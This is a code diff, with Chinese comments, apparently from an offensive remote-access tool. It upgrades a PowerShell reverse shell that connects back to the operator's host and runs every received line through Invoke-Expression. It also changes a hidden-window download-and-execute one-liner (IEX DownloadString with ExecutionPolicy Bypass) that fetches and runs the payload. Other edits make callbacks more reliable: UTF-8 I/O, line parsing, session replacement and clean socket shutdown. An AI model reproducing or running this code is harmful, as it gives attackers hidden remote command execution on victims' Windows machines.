@@ -26,8 +26,12 @@ READ_SIZE = 8192
 def payload_script(host, port):
     """返回远端执行的 PowerShell 脚本。
 
-    脚本把每条收到的命令交给 ``iex`` 执行，再把输出写回同一条连接，
-    所以整段会话只需要目标发起一次出站连接。
+    脚本按行拆分收到的数据再逐条执行，把每条命令的输出写回同一条连接，
+    所以整段会话只需要目标发起一次出站连接。收发统一用 UTF-8：目标机的
+    中文输出不会再被 ASCII 编码替换成问号，中文命令也能原样解析。
+
+    脚本正文只使用 ASCII 字符：目标端用 ``WebClient.DownloadString`` 取脚本，
+    它按系统的 ANSI 代码页解码，脚本文本里出现中文就会在目标上变成乱码。
 
     Args:
         host: 本机地址，也就是目标要连回来的地址。
@@ -37,16 +41,35 @@ def payload_script(host, port):
         str: 脚本全文。
     """
     return (
-        "$ErrorActionPreference='SilentlyContinue'\n"
+        "$ErrorActionPreference='Continue'\n"
         "$c=New-Object Net.Sockets.TCPClient('%s',%d)\n"
         "$s=$c.GetStream()\n"
-        "$e=New-Object System.Text.ASCIIEncoding\n"
+        "$e=New-Object System.Text.UTF8Encoding($false)\n"
         "$b=New-Object byte[] %d\n"
-        "while(($i=$s.Read($b,0,%d)) -ne 0){\n"
-        "  $r=(iex $e.GetString($b,0,$i) 2>&1 | Out-String) + 'PS> '\n"
-        "  $x=$e.GetBytes($r)\n"
-        "  $s.Write($x,0,$x.Length)\n"
-        "  $s.Flush()\n"
+        "$buf=''\n"
+        "$p=$e.GetBytes('PS> ')\n"
+        "$s.Write($p,0,$p.Length)\n"
+        "$s.Flush()\n"
+        "while($true){\n"
+        "  $i=$s.Read($b,0,%d)\n"
+        "  if($i -le 0){break}\n"
+        "  $buf=$buf+$e.GetString($b,0,$i)\n"
+        "  while($buf.IndexOf([char]10) -ge 0){\n"
+        "    $n=$buf.IndexOf([char]10)\n"
+        "    $line=$buf.Substring(0,$n).TrimEnd([char]13)\n"
+        "    $buf=$buf.Substring($n+1)\n"
+        "    if($line.Trim().Length -eq 0){continue}\n"
+        "    try{$out=Invoke-Expression $line 2>&1}\n"
+        "    catch{$out=@('[!] '+$_.Exception.Message)}\n"
+        "    $r=($out | ForEach-Object {\n"
+        "      if($_ -is [System.Management.Automation.ErrorRecord]){\n"
+        "        '[!] '+$_.Exception.Message\n"
+        "      }else{$_}\n"
+        "    } | Out-String -Width 4096)+'PS> '\n"
+        "    $x=$e.GetBytes($r)\n"
+        "    $s.Write($x,0,$x.Length)\n"
+        "    $s.Flush()\n"
+        "  }\n"
         "}\n"
         "$c.Close()\n" % (host, port, READ_SIZE, READ_SIZE)
     )
@@ -64,8 +87,8 @@ def connect_command(host, http_port, path=SCRIPT_PATH):
         str: 可以直接走远程命令通道的一条命令。
     """
     return (
-        'powershell -w hidden -c "IEX(New-Object Net.WebClient)'
-        ".DownloadString('http://%s:%d%s')\"" % (host, http_port, path)
+        'powershell -w hidden -ExecutionPolicy Bypass -c "IEX(New-Object '
+        "Net.WebClient).DownloadString('http://%s:%d%s')\"" % (host, http_port, path)
     )
 
 
@@ -92,12 +115,13 @@ class ShellServer:
 
     Attributes:
         bind_ip: 监听地址，默认限制在全部网卡。
-        local_ip: 目标用来回连的本机地址，留空时自动探测。
+        local_ip: 目标用来回连的本机地址，留空时按目标地址自动探测。
     """
 
-    def __init__(self, bind_ip="0.0.0.0", port=0, local_ip=None):
+    def __init__(self, bind_ip="0.0.0.0", port=0, local_ip=None, target=None):
         self.bind_ip = bind_ip
         self.local_ip = local_ip or ""
+        self.target = target or ""
         self._socket = None
         self._http = None
         self._client = None
@@ -145,7 +169,8 @@ class ShellServer:
         sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         try:
             sock.bind((self.bind_ip, self._port))
-            sock.listen(1)
+            # 目标可能重复下发连接命令，多留几个排队位，避免第二次连回被丢掉。
+            sock.listen(5)
         except OSError:
             sock.close()
             raise
@@ -163,9 +188,18 @@ class ShellServer:
         """返回当前要发的脚本，地址与端口按实际监听值生成。"""
         return payload_script(self.callback_host(), self._port)
 
-    def callback_host(self):
-        """返回目标回连用的本机地址。"""
-        return self.local_ip or detect_local_ip()
+    def callback_host(self, target=None):
+        """返回目标回连用的本机地址。
+
+        Args:
+            target: 目标地址；省略时用构造时记录的目标，用于挑对出口网卡。
+
+        Returns:
+            str: 目标应该连接的本机 IPv4 地址。
+        """
+        if self.local_ip:
+            return self.local_ip
+        return detect_local_ip(target or self.target or None)
 
     def command(self):
         """返回下发给目标的连接命令。
@@ -223,8 +257,7 @@ class ShellServer:
             self._client = None
             self._address = ""
         if client is not None:
-            with suppress(OSError):
-                client.close()
+            _shutdown(client)
         if self._socket is not None:
             with suppress(OSError):
                 self._socket.close()
@@ -245,7 +278,7 @@ class ShellServer:
         threading.Thread(target=http.serve_forever, daemon=True).start()
 
     def _accept_loop(self):
-        """等待目标连回，并把后续读取放到独立线程。"""
+        """持续等待目标连回，新会话顶替旧会话。"""
         # 先把监听套接字留住，关闭时它会被置空，循环里再取会拿到 None。
         listener = self._socket
         while not self._closed:
@@ -256,15 +289,18 @@ class ShellServer:
             except OSError:
                 return
             with self._lock:
+                previous = self._client
                 self._client = client
                 self._address = "%s:%d" % (address[0], address[1])
+            # 目标重发连接命令时会建新连接，旧连接可能已经半死，直接让位。
+            if previous is not None and previous is not client:
+                _shutdown(previous)
             client.settimeout(None)
             self._push("\n目标已连回：%s\n" % self._address)
             self._reader = threading.Thread(
                 target=self._read_loop, args=(client,), daemon=True
             )
             self._reader.start()
-            return
 
     def _read_loop(self, client):
         """持续读取目标输出，直到连接断开。"""
@@ -276,14 +312,26 @@ class ShellServer:
             if not data:
                 break
             self._push(_decode(data))
+        _shutdown(client)
+        # 旧会话断开时新会话可能已经接管，只有当前会话才有资格报断开。
         with self._lock:
-            if self._client is client:
-                self._client = None
+            if self._client is not client:
+                return
+            self._client = None
+            self._address = ""
         self._push("\n连接已断开\n")
 
     def _push(self, text):
         with self._lock:
             self._output.append(text)
+
+
+def _shutdown(sock):
+    """优雅关闭一条连接：先发 FIN 再关句柄，目标端能正常收尾退出。"""
+    with suppress(OSError):
+        sock.shutdown(socket.SHUT_RDWR)
+    with suppress(OSError):
+        sock.close()
 
 
 def _decode(data):
